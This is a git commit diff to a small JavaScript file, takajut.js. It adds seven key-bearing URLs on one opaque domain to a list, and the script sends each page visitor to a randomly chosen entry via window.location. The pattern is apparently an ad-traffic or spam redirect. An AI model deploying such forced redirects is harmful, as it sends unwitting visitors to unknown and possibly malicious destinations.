049c48a76b7fc909347d84560587159fbb42e53c
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-08-16 01:26:29 +0800

    Update takajut.js

--- takajut.js
+++ takajut.js
@@ -5,7 +5,14 @@ var dataUrl = [
 '//wonderfullytumultbizarre.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb',
 '//wonderfullytumultbizarre.com/rmdh7vzvs?key=ed9adfc3b8491179ad53c3e027d8b8a9',
 '//wonderfullytumultbizarre.com/nuudznpz3?key=3d998b3da5397f5ac865ff0734c2be19',
-'//wonderfullytumultbizarre.com/n970yii7c?key=434c6176282b18468a76f961e6a21764'
+'//wonderfullytumultbizarre.com/n970yii7c?key=434c6176282b18468a76f961e6a21764',
+ '//wonderfullytumultbizarre.com/mcq9dwrp?key=26877099e93b852a73d06043b22429bd',
+'//wonderfullytumultbizarre.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+'//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
+'//wonderfullytumultbizarre.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//wonderfullytumultbizarre.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+'//wonderfullytumultbizarre.com/y425t3d5k?key=b0d195ca768aeab7d18aad598d71b0b0',
+'//wonderfullytumultbizarre.com/ciwpm0hb7q?key=7f0434e3ed63cbba143ee2860b19fd5a'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
